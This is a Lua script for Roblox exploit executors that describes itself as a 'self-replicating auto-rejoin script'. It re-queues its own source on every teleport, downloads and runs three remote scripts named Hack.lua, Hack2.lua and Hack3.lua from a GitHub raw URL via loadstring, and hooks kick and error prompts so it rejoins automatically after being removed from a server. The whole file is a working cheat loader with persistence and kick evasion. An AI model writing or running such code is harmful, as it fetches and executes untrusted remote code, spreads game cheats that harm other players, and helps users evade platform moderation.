-- The core template for our self-replicating auto-rejoin script.
local ScriptTemplate = [====[
local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)

-- ==========================================
-- 1. QUEUE FOR THE NEXT REJOIN (INFINITE LOOP)
-- ==========================================
local Template = %q
if queue_on_teleport then
    -- It injects its own source code into the queue for the NEXT server
    queue_on_teleport(string.format(Template, Template))
end

-- ==========================================
-- 2. EXECUTE YOUR 3 EXTERNAL SCRIPTS
-- ==========================================
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack.lua"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack2.lua"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/quesopolisa-ai/Sigma/refs/heads/main/Hack3.lua"))()
    end)
end)

-- ==========================================
-- 3. AUTO-REJOIN LOGIC (CRASH-PROOF)
-- ==========================================
local TeleportService = game:GetService("TeleportService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")

local function safeRejoin()
    pcall(function()
        task.wait(2)
        if game.JobId ~= "" then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
        else
            -- Failsafe standard teleport if JobId was cleared
            TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        end
    end)
end

-- Fallback: If the target server instance is full, hop into any available server
TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    pcall(function()
        TeleportService:Teleport(game.PlaceId, player)
    end)
end)

-- Engine-level tracking. Catches all kick screens, disconnections, and errors safely.
GuiService.ErrorMessageChanged:Connect(function(errorMessage)
    task.spawn(safeRejoin)
end)

-- Secondary safety net: wrapped entirely in a protected call to guarantee no crashes
task.spawn(function()
    pcall(function()
        local CoreGui = game:GetService("CoreGui")
        local promptOverlay = CoreGui:WaitForChild("RobloxPromptGui", 5):WaitForChild("promptOverlay", 5)
        if promptOverlay then
            promptOverlay.ChildAdded:Connect(function(child)
                if child.Name == 'ErrorPrompt' then
                    task.spawn(safeRejoin)
                end
            end)
        end
    end)
end)
]====]

-- ==========================================
-- EXECUTE THE INITIAL CHAIN
-- ==========================================
local function StartInfiniteRejoin()
    local queue_on_teleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)
    
    if queue_on_teleport then
        queue_on_teleport(string.format(ScriptTemplate, ScriptTemplate))
    end
    
    loadstring(string.format(ScriptTemplate, ScriptTemplate))()
end

StartInfiniteRejoin()
